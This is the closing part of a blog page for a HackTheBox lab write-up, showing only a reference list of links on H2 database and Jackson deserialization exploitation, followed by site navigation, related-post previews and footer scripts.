</pre></table></code></div></div><hr /><p>ref</p><ul><li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">Abusing H2 Database ALIAS</a><li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">java.vul</a><li><a href="https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96">On Jackson CVEs: Don’t Panic — Here is what you need to know</a><li><a href="https://www.cvedetails.com/cve/CVE-2017-7525/">CVE</a><li><a href="https://stackoverflow.com/questions/12144284/what-are-used-for-in-pl-pgsql">$$</a><li><a href="https://portswigger.net/web-security/deserialization/exploiting">Exploiting insecure deserialization vulnerabilities</a></ul><p>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/lab/'>Lab</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >HackTheBox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Lab - HackyHour3 - Time - Grace&url=https://ocholuo.github.io//posts/HTB-Time/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Lab - HackyHour3 - Time - Grace&u=https://ocholuo.github.io//posts/HTB-Time/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Lab - HackyHour3 - Time - Grace&url=https://ocholuo.github.io//posts/HTB-Time/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/hankthebox/"><div class="card-body"> <span class="timeago small" >Nov 13, 2020<i class="unloaded">2020-11-13T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - HTB - Setup</h3><div class="text-muted small"><p> Lab - HTB - Setup starting point invite Lab - HTB - Setup starting point Connections to the lab environment are made with OpenVPN, which comes pre-installed on Par...</p></div></div></a></div><div class="card"> <a href="/posts/walk/"><div class="card-body"> <span class="timeago small" >Nov 13, 2020<i class="unloaded">2020-11-13T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - HackyHour0</h3><div class="text-muted small"><p> HackyHour0 - Entry HackyHour0 - Entry o$ nmap -sC -sV 10.10.10.27 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 21:29 EST Error #487: Your port specifications are illegal. Example ...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Feline/"><div class="card-body"> <span class="timeago small" >Nov 13, 2020<i class="unloaded">2020-11-13T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - HTB - Hard - Feline (HackyHour5)</h3><div class="text-muted small"><p> Lab - HTB - Hard - Feline (HackyHour5) Initial： Recon NMAP CVE in 2020 Gain access to shell Port 8080 b...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Feline/" class="btn btn-outline-primary" prompt="Older"><p>Lab - HTB - Hard - Feline (HackyHour5)</p></a> <a href="/posts/Burpsuite-Intruder/" class="btn btn-outline-primary" prompt="Newer"><p>Lab - Burpsuite - Intruder 发现敏感目录</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
